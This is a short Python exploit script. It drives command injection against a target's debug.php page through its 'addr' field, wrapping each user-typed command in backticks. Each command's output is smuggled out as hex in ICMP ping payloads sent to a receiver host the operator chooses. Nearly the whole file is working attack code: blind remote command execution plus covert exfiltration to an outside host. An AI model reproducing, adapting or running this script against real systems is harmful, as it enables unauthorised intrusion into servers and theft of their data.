#!/usr/bin/python3
# Author: Dahir Muhammad Dahir
# Date: 27-04-2019
# This module requires requests

import requests

host_addr = input("host address\n>>> ")
recv_addr = input("receiver address\n>>> ")


def main():
    while True:
        command = input(">>> ")
        if command == "exit" or command == "quit":
            break
        elif command:
            execute_command(command)


def execute_command(command):
    url = "http://{}/debug.php".format(host_addr)
    full_command = """{} -c`export LOVE=$({}); python -c $'import os;\ntext=os.getenv("LOVE");\nfor letter in text: hexstring = str(hex(ord(letter))).split("0x")[1];os.system("ping {} -c1 -p"+hexstring);\nos.system("ping {} -c2 -p0a")'`""".format(host_addr, command, recv_addr, recv_addr)
    payload = {"addr": full_command}
    with requests.Session() as s:
        s.post(url, data=payload)


if __name__ == "__main__":
    main()
